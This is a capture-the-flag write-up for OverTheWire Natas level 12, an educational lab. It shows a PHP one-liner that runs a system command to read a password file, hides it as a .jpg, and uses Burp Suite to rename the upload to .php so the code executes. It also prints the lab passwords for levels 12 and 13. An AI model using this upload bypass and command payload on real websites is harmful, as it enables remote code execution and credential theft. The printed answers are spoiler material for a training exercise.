# Natas CTF Solutions  

## Natas Level 12  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit **file upload vulnerability** to execute a PHP shell.  
- Retrieve the password for the next level.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas12.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas12`  
- **Password:** Use the password from Natas Level 11:  
```
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```  
![Home_Page](https://github.com/user-attachments/assets/1fa87cce-a963-406b-9d86-075e55eaf619)

---

### **Step 3: Analyze the Webpage**  
- The page contains an **upload feature** that allows you to upload image files.  
- Inspecting the source code reveals that file extensions are being checked, but MIME types can be bypassed.  

![Page Source](https://github.com/user-attachments/assets/864d7d6f-98fd-4b34-a843-5b65492a0eab)
 
---

### **Step 4: Create a Malicious PHP File**  
1. Create a PHP shell disguised as a `.jpg` file:  
```bash
echo '<?php echo system("cat /etc/natas_webpass/natas13"); ?>' > natas12.jpg
```  

2. This will create a file named `natas12.jpg` containing PHP code.  
![image](https://github.com/user-attachments/assets/579717fa-d6f3-45a0-8fd9-fc374da17f2c)

---

### **Step 5: Upload the Malicious File**  
- Upload the `natas12.jpg` file.  
- Open **Burp Suite** and enable **intercept mode**.  
- Modify the `filename` extension from `.jpg` to `.php` in the request:  
```  
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"  
```
![Chnaged_extension](https://github.com/user-attachments/assets/fd2bab97-bb48-4f39-ae43-8a8862d36a3a)
![image](https://github.com/user-attachments/assets/50624a0b-ece5-44f4-b281-84c3fd65a7e7)

- Forward the request.  

---

### **Step 6: Execute the File**  
- After uploading, a link to the file will appear on the page.
![Link](https://github.com/user-attachments/assets/3fb56620-4607-4c2c-8772-77baf6d06cdb)

- Open the link to execute the PHP code:  
```  
http://natas12.natas.labs.overthewire.org/uploads/x2etqejy94.php
```  
- The output will display the password for **Natas Level 13**.  

![Password](https://github.com/user-attachments/assets/5e953fbd-dbc7-4f80-9ca2-bebe9c96da2d)

---

### **✅ Password for Natas Level 13**  
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```  

---

## 💡 **Lessons Learned**  
✔️ **File Upload Vulnerabilities**: Servers often allow file uploads but may not properly validate file types or extensions.  
✔️ **MIME Type Bypass**: Modifying the content type or file extension can allow for command execution.  
✔️ **Burp Suite Manipulation**: Intercepting and modifying HTTP requests with Burp Suite is a key penetration testing technique.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code with Upload Logic | ![Page Source](https://github.com/user-attachments/assets/864d7d6f-98fd-4b34-a843-5b65492a0eab) |  
| Step 5 – Burp Suite Interception | ![Chnaged_extension](https://github.com/user-attachments/assets/fd2bab97-bb48-4f39-ae43-8a8862d36a3a) |  
| Step 6 – PHP Shell Execution | ![Password](https://github.com/user-attachments/assets/5e953fbd-dbc7-4f80-9ca2-bebe9c96da2d) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 13**:  
👉 [http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)  

---
